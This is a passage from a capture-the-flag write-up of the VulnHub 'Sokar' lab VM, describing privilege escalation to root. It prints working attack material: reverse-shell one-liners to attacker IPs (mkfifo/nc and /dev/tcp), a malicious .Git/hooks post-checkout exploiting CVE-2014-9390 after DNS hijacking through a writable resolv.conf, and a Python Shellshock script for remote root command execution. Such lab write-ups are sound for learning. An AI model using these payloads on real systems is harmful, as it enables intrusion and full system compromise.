   0x555555554a35 <main+326>:   mov    rdi,rbx
=> 0x555555554a38 <main+329>:   mov    eax,0x0
   0x555555554a3d <main+334>:   call   0x555555554750 <system@plt>
   0x555555554a42 <main+339>:   mov    rsp,r12
   0x555555554a45 <main+342>:   jmp    0x555555554a5d <main+366>
   0x555555554a47 <main+344>:   lea    rsi,[rip+0x12c]        # 0x555555554b7a
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe740 ("/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/")
0008| 0x7fffffffe748 ("/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/")
0016| 0x7fffffffe750 ("ne ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/")
0024| 0x7fffffffe758 ("/root@sokar-dev:/root/secret-project /mnt/secret-project/")
0032| 0x7fffffffe760 ("kar-dev:/root/secret-project /mnt/secret-project/")
0040| 0x7fffffffe768 ("/root/secret-project /mnt/secret-project/")
0048| 0x7fffffffe770 ("cret-project /mnt/secret-project/")
0056| 0x7fffffffe778 ("ject /mnt/secret-project/")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000555555554a38 in main ()
gdb-peda$ x/x $rbx
0x7fffffffe740: 0x2f
gdb-peda$ x/s $rbx
0x7fffffffe740:  "/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/"
gdb-peda$ x/s $rdx
0x7fffffffe7a0:  "f<:;f+ 'f. =i*%&',i::!sff;&&=\t:&\"(;d-,?sf;&&=f:,*;,=d9;&#,*=if$'=f:,*;,=d9;&#,*=f"
gdb-peda$
```

Right before this call though, there is a instruction to `call   0x5555555547a0 <setreuid@plt>` to set the UID to 0. So, this brought me to the conclusion that `build` is running `/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/` as `root`. But what is so special about this?

### inspecting git
I did a lot of poking around here, wondering if I should pursue the avenue of trying to exploit the b0f which has the SSP, or should I try and figure out the significance of a `git clone` as root? One of my first theories was that if I could get `sokar-dev` to resolve to something I am in control of (like my Kali vm), I could attempt to have git clone a setuid shell. This was, of course, before I remembered that the only permissions `git` will honor really is the symlink and executable bits :(

Further enumeration while I was thinking about the possibilities revealed that `/mnt/` was actually mounted with the `vfat` filesystem!

```bash
leonjza@kali/sokar $ python apophis.py "mount; cat /etc/fstab"
 * Executing /usr/bin/python -c "import time; time.sleep(2); print 'overdrive'" | /usr/bin/python -c "import pty; pty.spawn(['/bin/su', '-l', '-c','mount; cat /etc/fstab', 'apophis']);"

Password:
/dev/sda1 on / type ext4 (rw)
proc on /proc type proc (rw)
sysfs on /sys type sysfs (rw)
devpts on /dev/pts type devpts (rw,gid=5,mode=620)
tmpfs on /dev/shm type tmpfs (rw)
/dev/sdb1 on /mnt type vfat (rw,uid=501,gid=502)
none on /proc/sys/fs/binfmt_misc type binfmt_misc (rw)

#
# /etc/fstab
# Created by anaconda on Wed Nov 12 13:29:15 2014
#
# Accessible filesystems, by reference, are maintained under '/dev/disk'
# See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info
#
UUID=cdb3ac23-d831-4104-bc76-e3a56314b6e4 /                       ext4    defaults        1 1
tmpfs                   /dev/shm                tmpfs   defaults        0 0
devpts                  /dev/pts                devpts  gid=5,mode=620  0 0
sysfs                   /sys                    sysfs   defaults        0 0
proc                    /proc                   proc    defaults        0 0
/dev/sdb1       /mnt            vfat    defaults,uid=501,gid=502    0 0
```

As you can see, `/mnt` also specified the uid/gid for files on the mount, so even if I *were* able to get a suid shell onto the file system, root will not be the one owning it.

However. `vfat`. Why `vfat`... Of course! [CVE-2014-9390](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9390). The potential client side code execution bug in older `git` versions where a case insensitive filesystem may cause the `git` client to read hooks from `.Git/hooks` instead of `.git/hooks`. And, of course, `vfat` is a case insensitive filesystem, which makes for the perfect scenario to exploit this bug.

I checked up on the installed version of `git` on Sokar, just to make sure that it is in fact vulnerable:

```bash
leonjza@kali/sokar $ python apophis.py "git --version"
 * Executing /usr/bin/python -c "import time; time.sleep(2); print 'overdrive'" | /usr/bin/python -c "import pty; pty.spawn(['/bin/su', '-l', '-c','git --version', 'apophis']);"

Password:
git version 2.2.0
```

Great. `git` version 2.2.1 fixed this bug so we are in luck.

## rooting sokar
All of this information was great to have, but it still had one major problem. How can I clone a repository **I** own? I made *countless* attempts to try fool the environment into resolving `sokar-dev` to my Kali Host. Every single one failed. All of the material on the topic that I found online suggest that the SUID process 'cleans up' the environment, especially for reasons such as this one.

I started doubting my plan and was nearing a point of leaving Sokar for a bit to rethink my strategy when I realized the following gem:

```bash
leonjza@kali/sokar $ python apophis.py "find /etc/ -writable -type f 2>/dev/null | xargs ls -lh"
 * Executing /usr/bin/python -c "import time; time.sleep(2); print 'overdrive'" | /usr/bin/python -c "import pty; pty.spawn(['/bin/su', '-l', '-c','find /etc/ -writable -type f 2>/dev/null | xargs ls -lh', 'apophis']);"

Password:
-rw-rw-rw- 1 root root 19 Jan  2 20:12 /etc/resolv.conf
```

`/etc/resolv.conf` is **world writable**. This is perfect! I can change the DNS server to use to one that I control, obviously feeding it a IP that will be my local Kali instance :D

### preparing the environment and exploit
I decided to use `dnsmasq` for a quick to setup DNS server. I added a line to `/etc/dnsmasq.hosts` to answer a query for `sokar-dev`:

```bash
leonjza@kali/sokar $ cat /etc/dnsmasq.hosts
192.168.217.174 sokar-dev
```

... and started the `dnsmasq` server:

```bash
leonjza@kali/sokar $ dnsmasq --no-daemon --log-queries -H /etc/dnsmasq.hosts

dnsmasq: started, version 2.62 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt DBus i18n IDN DHCP DHCPv6 no-Lua TFTP conntrack
dnsmasq: reading /etc/resolv.conf
dnsmasq: using nameserver 192.168.252.2#53
dnsmasq: read /etc/hosts - 6 addresses
dnsmasq: read /etc/dnsmasq.hosts - 1 addresses
```

Testing my DNS server proved that it was working just fine:

```bash
leonjza@kali/sokar $ dig sokar-dev @127.0.0.1

; <<>> DiG 9.8.4-rpz2+rl005.12-P1 <<>> sokar-dev @127.0.0.1
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 48044
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;sokar-dev.         IN  A

;; ANSWER SECTION:
sokar-dev.      0   IN  A   192.168.217.174

;; Query time: 13 msec
;; SERVER: 127.0.0.1#53(127.0.0.1)
;; WHEN: Tue Feb  3 12:12:02 2015
;; MSG SIZE  rcvd: 43
```

Awesome. The next step was to replace the contents of Sokar's `/etc/resolv.conf` so that the dns server to use is *192.168.217.174* with the command `python apophis.py "echo \"nameserver\ 192.168.217.174\" > /etc/resolv.conf"` and confirm that it worked:

```bash
leonjza@kali/sokar $ python apophis.py "cat /etc/resolv.conf"
 * Executing /usr/bin/python -c "import time; time.sleep(2); print 'overdrive'" | /usr/bin/python -c "import pty; pty.spawn(['/bin/su', '-l', '-c','cat /etc/resolv.conf', 'apophis']);"

Password:
nameserver 192.168.217.174
```

Great. Testing time!

```bash
leonjza@kali/sokar $ python apophis.py "echo Y | /home/apophis/build"
 * Executing /usr/bin/python -c "import time; time.sleep(2); print 'overdrive'" | /usr/bin/python -c "import pty; pty.spawn(['/bin/su', '-l', '-c','echo Y | /home/apophis/build', 'apophis']);"

Password:
Cloning into '/mnt/secret-project'...
Host key verification failed.
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
Build? (Y/N)
```

Yesssssss, and nooooooooo. From the `dnsmasq` console output I could see the request for `sokar-dev` coming in and a reply getting sent:

```bash
dnsmasq: query[A] sokar-dev from 192.168.217.163
dnsmasq: /etc/dnsmasq.hosts sokar-dev is 192.168.217.174
```

However, in order for the SSH session to happen, I need to either accept or bypass the host key verification. There are many ways to do this, but sadly, with my current (still! :D) nonexistent interactive shell, I can not type 'yes'. I can not use `ssh-keyscan >> ~/.ssh/known_hosts` as I can't write to `root`'s `.ssh` directory, nor can I modify the command that is being passed onto `system()` in the binary to specify `-o StrictHostKeyChecking=no`.

Unfortunately, due to these restrictions, I had to finally give in and go one step back to `bynarr.py` and use his allowed egress access on `tcp/51242` to build a interactive shell. On one session I started a netcat listener, and on another, I ran `python bynarr.py "/bin/rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.217.174 51242 >/tmp/f"`.

```bash
leonjza@kali/sokar $ nc -lvp 51242
listening on [any] 51242 ...
192.168.217.163: inverse host lookup failed: Unknown server error : Connection timed out
connect to [192.168.217.174] from (UNKNOWN) [192.168.217.163] 40382
sh: no job control in this shell
sh-4.1$ python -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
[bynarr@sokar cgi-bin]$ su - apophis
su - apophis
Password: overdrive

[apophis@sokar ~]$ id
id
uid=501(apophis) gid=502(apophis) groups=502(apophis)
[apophis@sokar ~]$
```

With the interactive shell as `apophis` now, I was able to accept the SSH hostkey check.

The next thing left on the list was to prepare a `git` repository that can actually be cloned. Setting one up is reaaaaally simple. Because I knew that it will be looking for `/root/secret-project`, I prepared just that on my Kali VM:

```bash
leonjza@kali/sokar $ cd /root
leonjza@kali/root $ mkdir secret-project
leonjza@kali/root $ cd secret-project
leonjza@kali/root/secret-project $ git init --bare
Initialized empty Git repository in /root/secret-project/
leonjza@kali/root/secret-project | git:master $
```

Thats it... Next, I cloned it locally in a different folder.

```bash
leonjza@kali/sokar $ git clone ssh://127.0.0.1/root/secret-project
Cloning into 'secret-project'...
root@127.0.0.1's password:
warning: You appear to have cloned an empty repository.
leonjza@kali/sokar $ cd secret-project
leonjza@kali/sokar/secret-project | git:master $
```

Done. Working from a PoC exploit found [here](https://gitlab.com/mehmet/cve-2014-9390), I continued to prepare a similar exploit, except for the fact that I changed the actual hook to connect to my Mac (hosting the VM's) on a `tcp/22` netcat listener, spawning a shell. I knew `tcp/22` traffic was allowed due to the SSH host key verification step that needed some work :)

```bash
leonjza@kali/sokar/secret-project | git:master $ mkdir .Git
leonjza@kali/sokar/secret-project | git:master $ cd .Git
leonjza@kali/sokar/secret-project/.Git | git:master $ mkdir hooks
leonjza@kali/sokar/secret-project/.Git | git:master $ cd hooks
leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ vim post-checkout
leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ cat post-checkout
#!/bin/sh
bash -i >& /dev/tcp/192.168.217.1/22 0>&1
leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ chmod +x ./post-checkout
leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ git add -A
leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ git commit -m 'pwnd'
[master (root-commit) ee364fd] pwnd
 Committer: root <root@localhost.localdomain>

 1 file changed, 2 insertions(+)
 create mode 100755 .Git/hooks/post-checkout
leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ git push -u origin master
root@127.0.0.1's password:
Counting objects: 5, done.
Compressing objects: 100% (2/2), done.
Writing objects: 100% (5/5), 345 bytes, done.
Total 5 (delta 0), reused 0 (delta 0)
To ssh://127.0.0.1/root/secret-project
 * [new branch]      master -> master
Branch master set up to track remote branch master from origin.
leonjza@kali/sokar/secret-project/.Git/hooks | git:master $
```

With my evil repository ready, it was time to try that `build` again :)

```bash
[apophis@sokar ~]$ ./build
./build
Build? (Y/N) Y
Y
Cloning into '/mnt/secret-project'...
root@sokar-dev's password: # redact lol

remote: Counting objects: 5, done.
remote: Compressing objects: 100% (2/2), done.
Receiving objects: 100% (5/5), done.
remote: Total 5 (delta 0), reused 0 (delta 0)
Checking connectivity... done.

```

This shell just 'hung' there, however, the netcat listener on my Mac had a different story to tell:

```
leonjza@laptop » sudo nc -lv 22
Password:
[root@sokar secret-project]# cat /root/flag
cat /root/flag
                0   0
                |   |
            ____|___|____
         0  |~ ~ ~ ~ ~ ~|   0
         |  |   Happy   |   |
      ___|__|___________|___|__
      |/\/\/\/\/\/\/\/\/\/\/\/|
  0   |    B i r t h d a y    |   0
  |   |/\/\/\/\/\/\/\/\/\/\/\/|   |
 _|___|_______________________|___|__
|/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/|
|                                   |
|     V  u  l  n  H  u  b   ! !     |
| ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ |
|___________________________________|

=====================================
| Congratulations on beating Sokar! |
|                                   |
|  Massive shoutout to g0tmi1k and  |
| the entire community which makes  |
|         VulnHub possible!         |
|                                   |
|    rasta_mouse (@_RastaMouse)     |
=====================================
[root@sokar secret-project]#
```

## conclusion
What a blast! Them feels of r00t are so *gooood*. For the curios, that firewall that was making life so difficult:

```bash
[root@sokar secret-project]# cat /etc/sysconfig/iptables
cat /etc/sysconfig/iptables
# Firewall configuration written by system-config-firewall
# Manual customization of this file is not recommended.
*filter
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
-A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
-A INPUT -p icmp -j DROP
-A INPUT -i lo -j ACCEPT
-A INPUT -m state --state ESTABLISHED -p tcp --sport 22 -j ACCEPT
-A INPUT -m state --state NEW,ESTABLISHED -p tcp --dport 591 -j ACCEPT
-A INPUT -p udp --sport 53 -j ACCEPT
-A OUTPUT -m state --state NEW,ESTABLISHED -m owner --uid-owner 0 -p tcp --dport 22 -j ACCEPT
-A OUTPUT -p udp --dport 53 -m owner --uid-owner 0 -j ACCEPT
-A OUTPUT -m state --state ESTABLISHED -p tcp --sport 591 -j ACCEPT
-A OUTPUT -m state --state NEW,ESTABLISHED -m owner --gid-owner 501 -p tcp --dport 51242 -j ACCEPT
-A OUTPUT -j DROP
COMMIT
```

## edit

I have been wondering if it was possible to get complete remote root command execution using the sample python scripts used for apophis and bynarr. Well, turns out the `lime` script run with `sudo` can be shocked too!

```python
#!/usr/bin/python

# 2015 Leon Jacobs
# sokar remote root command execution

import requests
import sys

if len(sys.argv) < 2:

    print " * Usage %s <cmd>" % sys.argv[0]
    sys.exit(1)

# Grab the command from the args
command = sys.argv[1].strip()

# prep to shock the lime script
root_command = """echo "N" | sudo MAIL=\\"() { :;}; %s;\\" /home/bynarr/lime""" % command

# prep to exec the command as bynarr
payload = """/usr/bin/python -c "import time; time.sleep(1); print 'fruity'" | /usr/bin/python -c "import pty; pty.spawn(['/bin/su','-c','%s', 'bynarr']);" """ % root_command

# be verbose about the full command
print " * Executing %s\n" % payload

# Send the sploit
headers = { "User-Agent": "() { :;};echo;%s" % payload }
print requests.get("http://192.168.217.163:591/cgi-bin/cat", headers=headers).text.strip()
```

Run with `python root.py "/bin/cat /root/flag"` :D

Thanks to [@_RastaMouse](https://twitter.com/_RastaMouse) for the VM, and as always, [@VulnHub](https://twitter.com/VulnHub) for the hosting and great community!
